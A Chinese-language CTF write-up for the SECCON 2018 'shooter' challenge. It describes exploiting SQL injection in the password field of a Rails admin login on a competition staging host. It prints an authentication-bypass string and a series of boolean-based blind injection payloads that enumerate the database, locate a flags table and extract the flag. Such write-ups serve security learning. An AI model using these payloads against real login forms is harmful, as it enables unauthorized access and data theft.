# shooter

這題放在Reverse分類

但其實後半是Web

前半可以參考[Terrynini](https://github.com/terrynini/CTF-writeup/tree/master/SECCON-2018-quals#shooter)的writeup

<br>

後面會拿到一個登入介面的網址: http://staging.shooter.pwn.seccon.jp/admin/sessions/new

看了一下，是Rails寫的

fuzzing一波可以發現，password的地方可以Injection

塞單引號會噴Error:

![](https://i.imgur.com/modJUAC.png)

然後塞`'))) or 1=1#`可以登入成功

但裡頭沒啥有用內容

所以這邊可以用Boolean Based SQL Injection去撈撈看DB中的資料


`'))) or ((select schema_name from information_schema.schemata limit 1,1) regexp binary '^[a-z]'#`

`'))) or ((select schema_name from information_schema.schemata limit 1,1) regexp binary '^(s)[a-z]'#`

...

得到庫名: `shooter_staging`

`'))) or ((select table_name from information_schema.tables where table_schema='shooter_staging' limit 1,1) regexp binary '^[a-z]'#`

...

得到前兩張表名: `ar_internal_metadata`, `flags`

繼續深入挖`flags`，可以得到column: `id` , `value`, `created_at`, `updated_at`

`value`看起來很可疑，繼續挖:

`'))) or ((select value from shooter_staging.flags limit 0,1) regexp binary '^[A-Z]')#`

`'))) or ((select value from shooter_staging.flags limit 0,1) regexp binary '^(S)[A-Z]')#`

...

`'))) or ((select value from shooter_staging.flags limit 0,1) regexp binary '^(SECCON{)(1NV4L1D)')#`

...

得到FLAG: `SECCON{1NV4L1D_4DM1N_P4G3_4U+H3NT1C4T10N}`

